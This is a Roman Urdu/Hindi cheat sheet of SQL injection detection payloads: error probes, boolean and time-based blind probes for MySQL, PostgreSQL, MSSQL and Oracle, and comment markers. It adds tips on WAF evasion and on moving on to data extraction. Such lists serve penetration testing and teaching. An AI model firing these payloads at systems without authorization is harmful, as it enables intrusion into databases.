Kisi parameter par sirf yeh check karne ke liye ke **SQLi exist karti hai ya nahi**, hum **Detection / Probing Payloads** use karte hain—data nikalne wale payloads baad ka step hain.

### 1. Basic Syntax & Error Probes (Error-Based Check)
Ye payloads check karte hain ke kya tumhara input query ka syntax tod kar database error ya abnormal response पैदा karta hai:
 * '
 * "
 * ')
 * ")
 * '))
 * "))
 * \'
 * \"
Agar in se SQL error aaye, page crash ho, ya normal response se alag behavior dikhe, to signal milta hai.
### 2. Boolean-Based Blind Probes (True / False Check)
Jahan error direct nazar na aaye, wahan page ke content ya length/status code mein **True vs False** ka farq dekha jata hai:
 * **String context ('...'):**
   * ' AND 1=1-- 
   * ' AND 1=2-- 
   * ' AND 'a'='a
   * ' AND 'a'='b
   * ' OR 1=1-- 
   * ' OR 1=2-- 
 * **Numeric context (123):**
   * AND 1=1
   * AND 1=2
   * OR 1=1
   * OR 1=2
 * **Parentheses ((...)) context:**
   * ') AND 1=1-- 
   * ') AND 1=2-- 
   * ') OR 1=1-- 
**Rule:** Agar 1=1 (ya OR 1=1) par page kuch aur dikhaye aur 1=2 (ya AND 1=2) par farq pare, to boolean SQLi ka strong ishara hota hai.
### 3. Time-Based Blind Probes (Delay Check)
Jab page par koi error ya visible difference na aaye, to database ko thori der rok kar **response time** mein delay check kiya jata hai:
 * **MySQL / MariaDB:**
   * ' AND SLEEP(5)-- 
   * ' OR SLEEP(5)-- 
   * AND SLEEP(5)
   * ') AND SLEEP(5)-- 
 * **PostgreSQL:**
   * ' AND pg_sleep(5)-- 
   * '; SELECT pg_sleep(5)--
   * AND pg_sleep(5)
 * **SQL Server (MSSQL):**
   * '; WAITFOR DELAY '0:0:5'--
   * ' AND 1=(SELECT 1 FROM (SELECT(SLEEP(5)))a)--  (ya MSSQL mein WAITFOR)
   * WAITFOR DELAY '0:0:5'
 * **Oracle:**
   * ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- 
**Rule:** Agar normal request ~0.2s mein aati hai aur payload bhejne par ~5s ka delay aaye (aur dobara test karne par bhi delay aaye), to time-based SQLi ka signal milta hai.
### 4. Comment Markers (Query End Clean-Up)
Jab tum koi condition ya query inject karte ho to baqi bachi hui SQL query ko comment out karne ke liye ye markers kaam aate hain:
 * --  (MySQL/MSSQL/PostgreSQL/SQLite mein dash ke baad space aksar zaroori hota hai)
 * # (MySQL/MariaDB mein line comment)
 * /* aur */ (Block comments)
### 5. Detection Ke Waqt Zaroori Baatein
 * **Har Jagah Sab Payloads Nahi Chalenge:** Agar parameter id numeric hai to ' AND 1=1--  shayad syntax error de, wahan  AND 1=1 ya  AND SLEEP(5) zyada fit baithega.
 * **False Positives Se Bacho:** Kabhi network lag ya slow server ki wajah se bhi delay aa sakta hai—time-based ko confirm karne ke liye 2–3 baar test karo.
 * **WAF / Filtering:** Agar basic payloads par 403 Forbidden ya block page aaye, to iska matlab filter laga hai; phir encoding, comments, ya case change test kiye jaate hain.
Jab kisi parameter par in mein se koi probe **positive signal** de (error, boolean difference, ya time delay), tab tum agle phase—**DB type/version aur extraction**—par jaate ho.
